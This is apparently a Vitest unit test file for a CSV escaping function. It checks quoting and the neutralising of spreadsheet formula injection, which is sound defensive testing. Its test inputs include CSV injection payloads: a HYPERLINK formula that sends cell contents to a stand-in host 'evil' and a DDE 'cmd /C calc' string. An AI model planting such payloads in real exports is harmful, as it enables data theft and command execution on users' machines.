import { describe, it, expect } from "vitest"
import { csvEscape } from "@/lib/csv"

describe("csvEscape", () => {
  it("null / undefined は空文字", () => {
    expect(csvEscape(null)).toBe("")
    expect(csvEscape(undefined)).toBe("")
  })

  it("カンマ・改行・ダブルクォートを含む値はクォートする", () => {
    expect(csvEscape('a,b')).toBe('"a,b"')
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""')
    expect(csvEscape("1行目\n2行目")).toBe('"1行目\n2行目"')
  })

  it("数式として評価される先頭文字を無害化する", () => {
    expect(csvEscape('=HYPERLINK("http://evil/?"&A1,"click")')).toBe(
      `"'=HYPERLINK(""http://evil/?""&A1,""click"")"`
    )
    expect(csvEscape("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)")
    expect(csvEscape("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0")
    expect(csvEscape("-2+3+cmd")).toBe("'-2+3+cmd")
  })

  it("電話番号・数値・通常の文字列はそのまま", () => {
    expect(csvEscape("+81 90-1234-5678")).toBe("+81 90-1234-5678")
    expect(csvEscape(-5)).toBe("-5")
    expect(csvEscape("山田 太郎")).toBe("山田 太郎")
    expect(csvEscape("a=b")).toBe("a=b")
  })
})
